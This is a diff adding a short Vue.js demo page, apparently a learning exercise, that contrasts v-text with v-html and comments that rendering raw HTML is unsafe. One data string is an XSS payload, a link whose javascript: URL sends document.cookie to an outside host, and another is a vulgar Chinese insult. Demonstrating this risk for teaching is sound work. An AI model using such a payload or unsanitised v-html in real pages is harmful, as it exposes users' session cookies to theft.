@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="/vue.js"></script>
+</head>
+<body>
+    <div id="root">
+        <h1>{{name}}</h1>
+        <!-- v-text拿到name的值替换掉整个文本 -->
+        <h1 v-text="name"></h1>
+        <span v-html="str"></span>
+        <span v-html="str1"></span>
+        <!-- 动态解析html标签不安全 -->
+    </div>
+    <script>
+        new Vue({
+            el: '#root',
+            data: {
+                name: 'zjj',
+                str: '<h1>你就是个寄吧</h1>',
+                str1: '<a href=javascript:location.href="https://www.baidu.com?"+document.cookie>快来点我</a>'
+            }
+        })
+    </script>
+</body>
+</html>
